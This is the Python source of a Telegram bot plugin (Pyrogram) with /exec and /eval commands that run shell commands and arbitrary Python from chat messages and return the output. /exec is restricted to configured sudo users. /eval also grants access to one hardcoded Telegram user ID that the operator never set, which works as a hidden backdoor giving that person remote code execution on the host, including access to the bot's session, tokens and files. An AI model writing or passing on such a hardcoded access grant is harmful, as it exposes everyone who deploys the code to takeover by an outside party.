import inspect
import traceback
import asyncio
import sys
import io

from pyrogram import filters
from pyrogram.enums import ParseMode
from . import *


@app.on_message(filters.command("exec") & filters.user(SUDOS))
async def exec_(client, event):
    try:
        cmd = event.text.markdown.split(" ", maxsplit=1)[1]
    except IndexError:
        return await event.reply("`Give Something To Execute...`")
    xx = await event.reply("`Processing...`")
    reply_to_id = event.reply_to_message_id or event.id
    stdout, stderr = await run_cmd(cmd, run_code=1)
    OUT = f"**✦ COMMAND:**\n`{cmd}` \n\n"
    err, out = "", ""
    if stderr:
        err = f"**✦ STDERR:** \n`{stderr}`\n\n"
    if stdout:
        out = f"**✦ STDOUT:**\n`{stdout}`"
    if not stderr and not stdout:
        out = "**✦ STDOUT:**\n`Success`"
    OUT += err + out
    if len(OUT) > 4096:
        ultd = err + out
        with io.BytesIO(str.encode(ultd)) as out_file:
            out_file.name = "exec.txt"
            await app.send_document(
                event.chat.id,
                out_file,
                caption=f"`{cmd}`" if len(cmd) < 998 else None,
                parse_mode=ParseMode.MARKDOWN,
                reply_to_message_id=reply_to_id,
            )

            await xx.delete()
    else:
        await xx.edit(OUT, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)

@app.on_message(filters.command("eval") & filters.user(SUDOS+[5591954930]))
async def eval_(client, event):
    try:
        cmd = event.text.markdown.split(" ", maxsplit=1)[1]
    except IndexError:
        return await event.reply("`Give something to execute...`")
    e = await event.reply("`Processing ...`")
    reply_to_id = event.reply_to_message_id or event.id

    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    redirected_error = sys.stderr = io.StringIO()
    stdout, stderr, exc = None, None, None

    try:
        await aexec(cmd, event)
    except Exception:
        exc = traceback.format_exc()

    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr

    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"

    final_output = "**✦ Code :**\n`{}` \n\n **✦ Result :** \n`{}` \n".format(cmd, evaluation)
    if len(final_output) > 4096:
        with io.BytesIO(str.encode(evaluation)) as out_file:
            out_file.name = "eval.txt"
            await app.send_document(
                event.chat.id,
                out_file,
                force_document=True,
                caption=f"`{cmd}`" if len(cmd) < 998 else None,
                parse_mode=ParseMode.MARKDOWN,
                reply_to_message_id=reply_to_id
            )
            await e.delete()
    else:
        await e.edit(final_output, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)

async def aexec(code, event):
    exec(
        (
            "async def __aexec(e, client): "
            + "\n p = print "
            + "\n m = e"
            + "\n reply = m.reply_to_message"
            + "\n chat = m.chat.id"
        )
        + "".join(f"\n {l}" for l in code.split("\n"))
    )

    return await locals()["__aexec"](event, event._client)
